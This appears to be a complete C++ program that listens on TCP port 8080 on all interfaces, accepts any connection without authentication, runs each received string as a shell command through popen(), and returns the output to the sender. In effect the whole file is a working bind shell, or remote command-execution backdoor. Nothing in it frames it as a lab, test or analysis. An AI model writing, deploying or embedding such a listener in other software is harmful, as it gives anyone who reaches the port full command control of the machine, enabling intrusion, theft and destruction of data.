#include <iostream>
#include <stdexcept>
#include <cstdio>
#include <cstring>
#include <string>
#include <thread>
#include <vector>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

using namespace std;

string exec(const char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

void handleClient(int clientSocket) {
    char buffer[1024];
    while (true) {
        ssize_t bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) break;

        buffer[bytesReceived] = '\0';

        string command(buffer);
        cout << "Received command: " << command << endl;

        try {
            string result = exec(command.c_str());
            send(clientSocket, result.c_str(), result.size(), 0);
        } catch (const exception& e) {
            string errorMsg = "Error executing command: " + string(e.what());
            send(clientSocket, errorMsg.c_str(), errorMsg.size(), 0);
        }
    }

    close(clientSocket);
    cout << "Client disconnected." << endl;
}

int main() {
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1) {
        cerr << "Socket creation failed!" << endl;
        return -1;
    }

    // Configure server address and bind to port
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1) {
        cerr << "Bind failed!" << endl;
        close(serverSocket);
        return -1;
    }

    if (listen(serverSocket, SOMAXCONN) == -1) {
        cerr << "Listen failed!" << endl;
        close(serverSocket);
        return -1;
    }

    cout << "Server listening on port 8080..." << endl;
    vector<thread> threads;
    while (true) {
        sockaddr_in clientAddr;
        socklen_t clientSize = sizeof(clientAddr);
        int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientSize);
        if (clientSocket == -1) {
            cerr << "Accept failed!" << endl;
            continue;
        }

        cout << "Client connected!" << endl;
        threads.emplace_back(thread(handleClient, clientSocket));
    }

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }
    close(serverSocket);
    return 0;
}

